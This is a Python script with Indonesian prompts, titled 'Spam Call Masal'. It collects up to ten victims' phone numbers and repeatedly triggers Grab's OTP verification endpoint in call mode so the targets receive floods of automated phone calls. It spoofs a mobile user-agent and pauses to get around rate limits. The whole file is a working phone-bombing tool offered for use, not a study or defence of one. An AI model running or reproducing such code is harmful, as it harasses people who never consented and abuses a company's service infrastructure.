#!/usr/bin/python
#-*-coding: utf-8-*-
try:
	import os, requests, time, json
except ModuleNotFoundError:
	print("\ninstall module request dulu")
	print("$ pip install requests\n")
	exit()


c=('\033[94m')
print("%s\n     _   _            _   _\n  __| | (_)  __    __| | (_)  __\n/ _`  | | | / _| / _`  | | | / _|\n\__,__| |_| \__| \__,__| |_| \__|%s"%(c,c))
print("%s  S p a m   C a l l   M a s a l\n%s"%(c,c))
k=('\033[4;39m')
print("%s * Author : DicDic%s"%(k,k))
print("%s * Github : https://github.com/YellowRicePunk%s\n"%(k,k))
h=('\033[0;36m')
print("""%sMasukan Nomor Dengan Awalan "62" (EX: 628xxxxxxxx)\n%s"""%(h,h))

g=('\033[1;91m')
print("%s[*] Klik ENTER untuk skip Target\n%s"%(g,g))
w=('\033[33m')
no1 = input("%s[?] Nomor Target 1 => %s"%(w,w))
no2 = input("%s[?] Nomor Target 2 => %s"%(w,w))
no3 = input("%s[?] Nomor Target 3 => %s"%(w,w))
no4 = input("%s[?] Nomor Target 4 => %s"%(w,w))
no5 = input("%s[?] Nomor Target 5 => %s"%(w,w))
no6 = input("%s[?] Nomor Target 6 => %s"%(w,w))
no7 = input("%s[?] Nomor Target 7 => %s"%(w,w))
no8 = input("%s[?] Nomor Target 8 => %s"%(w,w))
no9 = input("%s[?] Nomor Target 9 => %s"%(w,w))
no10 = input("%s[?] Nomor Target 10 => %s"%(w,w))
r=('\033[32m')
jlmh=int(input("%s\nJumlah Spam => %s"%(r,r)))

try:
	henti_tanya=False
	forcecon=0
	print("\n%s[-] RESULT:%s"%(r,w));time.sleep(1)
	for i in range(jlmh):
		cout=1
		print(f"{'{'}{i+1}{'}'}"+"="*40+f"{'{'}{i+1}{'}'}")
		for i in no1,no2,no3,no4,no5,no6,no7,no8,no9,no10:
			if i == '':
				cout+=1
				continue
			dt={'method':'CALL','countryCode':'id','phoneNumber':i,'templateID':'pax_android_production'}
			r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt,headers={'user-agent':'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6264; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36'})

			if "10074" in r1.text:
				print(f"[!] Sepertinya {r}TARGET{cout}{w} terkena limit, cobalah beberapa saat lagi")
				if henti_tanya == True:
					pass
				else:
					pil=input("[?] Ingin menjeda program selama 60 detik (1 menit) [y/n] ")
					if pil.lower() == 'y':
						for x in range(60):
							try:
								print(end=f"\r[!] Jeda {60-(x+1)} detik",flush=True)
								time.sleep(1)
							except: break
						print("\n[OK]")
					elif pil.lower() == 'f':
						henti_tanya=True
					else:
						forcecon+=1
						if forcecon >= 3:
							print(f"[!] {c}tekan F untuk menghentikan pertanyaan{w}")
			elif "challengeID" in r1.text:
				print(f"[+] {c}TARGET{cout} {g}BERHASIL{w}")
			else:
				print(f"[-] {c}TARGET{cout} {r}GAGAL{w}")
			time.sleep(10)
			cout+=1
	print("{end}"+"="*40+"{end}")
except KeyboardInterrupt:
	print("\n%s bajingan..."%(c))
